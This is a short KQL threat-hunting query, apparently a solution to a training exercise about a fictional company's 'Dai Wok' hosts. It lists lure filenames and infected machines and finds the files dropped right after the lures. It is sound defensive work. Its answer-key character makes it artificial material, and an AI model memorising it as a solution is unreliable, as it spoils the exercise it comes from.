///find the rest of the file on the Dai Wok host machines

let ThreatFiles = datatable(filename:string)
[
"Closing_Locations.xlsx",
"Pay_Raises.lnk",
"HR_Notes.pdf",
"Schedule_Changes.xlsx",
"Local_County_Updates.xlsx"
];
let InfectedHosts = datatable(hostname:string)
[
"VQRT-DESKTOP",
"S3XE-DESKTOP",
"JP9Y-DESKTOP",
"KLWM-DESKTOP",
"1FK7-MACHINE",
"68DY-LAPTOP",
"RWK7-MACHINE"
];
let MalwareFiles =
FileCreationEvents
| where hostname  in (InfectedHosts)
| sort by hostname asc, timestamp asc
| serialize
| extend NextFile = next(filename)
| where filename in (ThreatFiles)
| where isnotempty(NextFile)
| where NextFile !in (ThreatFiles)
| distinct NextFile;
FileCreationEvents
| where hostname  in (InfectedHosts)
| where filename in (MalwareFiles)
